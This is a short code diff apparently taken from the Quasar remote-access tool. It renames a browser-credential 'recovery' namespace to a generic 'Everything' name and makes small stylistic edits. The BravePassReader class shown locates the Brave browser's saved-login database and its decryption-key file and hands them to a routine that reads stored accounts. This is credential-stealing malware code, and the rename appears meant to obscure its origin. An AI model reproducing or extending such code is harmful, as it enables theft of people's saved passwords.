@@ -3,7 +3,7 @@ using System;
 using System.Collections.Generic;
 using System.IO;
 
-namespace Quasar.Client.Recovery.Browsers
+namespace Everything.Recovery.Browsers
 {
     public class BravePassReader : ChromiumBase
     {
@@ -15,9 +15,9 @@ namespace Quasar.Client.Recovery.Browsers
         {
             try
             {
-                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+                var filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                     "BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data");
-                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+                var localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                     "BraveSoftware\\Brave-Browser\\User Data\\Local State");
                 return ReadAccounts(filePath, localStatePath);
             }
